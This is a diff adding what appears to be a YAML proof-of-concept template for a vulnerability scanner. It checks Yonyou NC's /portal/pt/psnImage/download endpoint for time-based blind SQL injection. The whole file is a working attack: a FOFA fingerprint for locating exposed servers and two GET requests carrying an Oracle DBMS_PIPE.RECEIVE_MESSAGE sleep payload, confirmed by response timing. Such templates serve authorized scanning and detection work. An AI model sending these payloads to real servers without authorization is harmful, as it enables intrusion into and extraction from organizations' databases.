@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-psnImage-sqli
+info:
+  name: 用友NC接口/psnImage/download存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: icon_hash="1085941792'
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 3
+  t3: random_int(1,4)
+  t4: t3 + 3
+requests:
+- method: GET
+  path: /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),{{.t1}})%20AND%20(%27rASZ%27=%27rASZ
+  expression: 'status_code == 200 &&
+
+    duration >= t1 &&
+
+    duration <= t2 &&
+
+    contains(body,"PNG") &&
+
+    contains(headers,"image/png")
+
+    '
+- method: GET
+  path: /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),{{.t3}})%20AND%20(%27rASZ%27=%27rASZ
+  expression: 'status_code == 200 &&
+
+    duration >= t3 &&
+
+    duration <= t4 &&
+
+    contains(body,"PNG") &&
+
+    contains(headers,"image/png")
+
+    '
+transport: http
